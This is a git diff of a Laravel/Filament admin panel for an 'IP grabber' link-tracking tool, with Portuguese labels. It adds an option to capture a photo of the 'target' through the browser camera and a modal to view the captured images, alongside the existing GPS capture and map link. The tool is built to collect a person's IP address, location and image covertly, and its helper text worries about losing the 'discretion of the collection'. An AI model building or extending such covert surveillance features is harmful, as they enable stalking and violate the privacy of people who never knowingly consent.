@@ -6,7 +6,10 @@ use App\Filament\Resources\PixelTracks\Pages\CreateIpGrabber;
 use App\Filament\Resources\PixelTracks\Pages\ListIpGrabbers;
 use App\Filament\Resources\PixelTracks\Pages\ViewIpGrabber;
 use App\Models\IpGrabber;
+use App\Models\IpGrabberFoto;
 use Filament\Actions;
+use Illuminate\Support\Facades\Storage;
+use Illuminate\Support\HtmlString;
 use Filament\Forms;
 use Filament\Notifications\Notification;
 use Filament\Resources\Resource;
@@ -81,7 +84,7 @@ class IpGrabberResource extends Resource
     public static function getEloquentQuery(): Builder
     {
         return parent::getEloquentQuery()
-            ->with('criador')
+            ->with(['criador', 'fotoMaisRecente'])
             ->where('created_by', auth()->id())
             ->where('tracking_channel', 'link')
             ->latest();
@@ -155,6 +158,12 @@ class IpGrabberResource extends Resource
 
                     Forms\Components\Toggle::make('capture_gps')
                         ->label('Solicitar GPS do alvo')
+                        ->default(false)
+                        ->helperText('Depende de autorização explícita do alvo no navegador. Pode comprometer a discrição da coleta.')
+                        ->columnSpanFull(),
+
+                    Forms\Components\Toggle::make('capture_alvo')
+                        ->label('Capturar foto do alvo')
                         ->default(false)
                         ->helperText('Depende de autorização explícita do alvo no navegador. Pode comprometer a discrição da coleta.')
                         ->columnSpanFull(),
@@ -285,6 +294,47 @@ class IpGrabberResource extends Resource
                     ->visible(fn (IpGrabber $record) => $record->gps_latitude !== null)
                     ->url(fn (IpGrabber $record) => "https://www.google.com/maps?q={$record->gps_latitude},{$record->gps_longitude}")
                     ->openUrlInNewTab(),
+
+                Actions\Action::make('ver_foto')
+                    ->label('Foto')
+                    ->icon('heroicon-o-camera')
+                    ->color('success')
+                    ->visible(fn (IpGrabber $record) => $record->fotoMaisRecente !== null)
+                    ->modalHeading('Foto capturada do alvo')
+                    ->modalContent(function (IpGrabber $record): HtmlString {
+                        /** @var IpGrabberFoto|null $foto */
+                        $foto = $record->fotoMaisRecente;
+
+                        if (! $foto) {
+                            return new HtmlString('<p class="text-center text-gray-500 py-4">Foto não encontrada.</p>');
+                        }
+
+                        $url   = e(Storage::disk('public')->url($foto->path));
+                        $total = $record->fotos()->count();
+                        $info  = $foto->created_at
+                            ? $foto->created_at->timezone('America/Sao_Paulo')->format('d/m/Y H:i:s')
+                            : '—';
+
+                        return new HtmlString(<<<HTML
+                            <div class="flex flex-col items-center gap-3 py-2">
+                                <img
+                                    src="{$url}"
+                                    alt="Foto capturada"
+                                    style="max-width:100%;max-height:65vh;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.18);"
+                                >
+                                <p class="text-xs text-gray-400">Capturada em {$info} · {$total} foto(s) total</p>
+                                <a
+                                    href="{$url}"
+                                    target="_blank"
+                                    rel="noopener"
+                                    class="text-xs text-primary-600 hover:underline"
+                                >Abrir em tamanho original ↗</a>
+                            </div>
+                        HTML);
+                    })
+                    ->modalSubmitAction(false)
+                    ->modalCancelActionLabel('Fechar'),
+
                 Actions\DeleteAction::make()->label('Excluir'),
             ])
             ->emptyStateHeading('Nenhum link criado')
